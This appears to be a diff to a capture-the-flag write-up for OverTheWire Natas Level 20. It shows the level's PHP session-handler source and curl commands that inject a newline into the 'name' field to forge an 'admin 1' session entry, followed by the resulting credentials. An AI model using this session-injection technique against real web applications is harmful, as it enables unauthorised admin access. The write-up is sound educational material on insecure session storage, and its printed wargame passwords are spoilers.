@@ -1852,10 +1852,228 @@ Don't use **predictable session IDs**! (Even if you hex-encode them, there are s
 
 ### Level 20
 
-- **Date**: 2026-04-05
+- **Date**: 2026-04-04
 - **URL**: `http://natas20.natas.labs.overthewire.org`
 - **Password**: `p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`
-- **Tools**: Web Browser, `PHP`, `Bash`, `curl`
+- **Tools**: Web Browser, `curl`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<div id="content">
+You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
+<form action="index.php" method="POST">
+Your name: <input name="name" value=""><br>
+<input type="submit" value="Change name" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's check out that source code (URL/index-source.html):
+
+```php
+<?php
+
+function debug($msg) { /* {{{ */
+    if(array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas21\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
+    }
+}
+/* }}} */
+
+/* we don't need this */
+function myopen($path, $name) {
+    //debug("MYOPEN $path $name");
+    return true;
+}
+
+/* we don't need this */
+function myclose() {
+    //debug("MYCLOSE");
+    return true;
+}
+
+function myread($sid) {
+    debug("MYREAD $sid");
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode() ?: "";
+}
+
+function mywrite($sid, $data) {
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data");
+    // make sure the sid is alnum only!!
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+    return true;
+}
+
+/* we don't need this */
+function mydestroy($sid) {
+    //debug("MYDESTROY $sid");
+    return true;
+}
+/* we don't need this */
+function mygarbage($t) {
+    //debug("MYGARBAGE $t");
+    return true;
+}
+
+session_set_save_handler(
+    "myopen",
+    "myclose",
+    "myread",
+    "mywrite",
+    "mydestroy",
+    "mygarbage");
+session_start();
+
+if(array_key_exists("name", $_REQUEST)) {
+    $_SESSION["name"] = $_REQUEST["name"];
+    debug("Name set to " . $_REQUEST["name"]);
+}
+
+print_credentials();
+
+$name = "";
+if(array_key_exists("name", $_SESSION)) {
+    $name = $_SESSION["name"];
+}
+
+?>
+```
+
+Notice the custom session handler with `myread()` and `mywrite()`.
+
+The session data is stored in a file named `mysess_<sid>`.
+
+Notice `$data .= "$key $value\n";` in `mywrite()`.
+
+This means that the session data is stored in a very simple format of `<key> <value>\n`.
+
+And notice `foreach(explode("\n", $data) as $line)` in `myread()`.
+
+This means that the session data is read line by line and split into key and value by the first space character!
+
+We can only set the `name` key in the session, but we can set its value to something like `foo\nadmin 1`!
+
+Use `curl` to send `name=foo%0Aadmin%201` in the POST data and then check the response.
+
+```powershell
+curl.exe -i -c cookies.txt -X POST `
+  -d "name=foo`nadmin 1" `
+  -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw `
+  http://natas20.natas.labs.overthewire.org/
+```
+
+This request <u>writes</u> the following to the session file:
+```txt
+name foo
+admin 1
+```
+
+Now use `curl` again to read the session file and see if we are an admin:
+```powershell
+curl.exe -i -b cookies.txt `
+  -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw `
+  http://natas20.natas.labs.overthewire.org/
+```
+
+This request <u>reads</u> the session file and sets `$_SESSION["name"] = "foo"` and `$_SESSION["admin"] = "1"`.
+
+And you will see that the response contains the credentials for natas21:
+```powershell
+HTTP/1.1 200 OK
+Date: Sat, 04 Apr 2026 17:14:35 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1164
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas20", "pass": "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw" };</script></head>
+<body>
+<h1>natas20</h1>
+<div id="content">
+You are an admin. The credentials for the next level are:<br><pre>Username: natas21
+Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>
+<form action="index.php" method="POST">
+Your name: <input name="name" value="foo"><br>
+<input type="submit" value="Change name" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+And the password for natas21 is `BPhv63cKE1lkQl04cE5CuFTzXe15NfiH`.
+
+#### The Lesson
+
+Don't write your own session handler! (And if you do, use a secure, **non-injectable** format.)
+
+## Levels 21 - 25
+
+### Level 21
+
+- **Date**: 2026-04-05
+- **URL**: `http://natas21.natas.labs.overthewire.org`
+- **Password**: `BPhv63cKE1lkQl04cE5CuFTzXe15NfiH`
+- **Tools**: Web Browser, `curl`
 
 #### The Solution
 
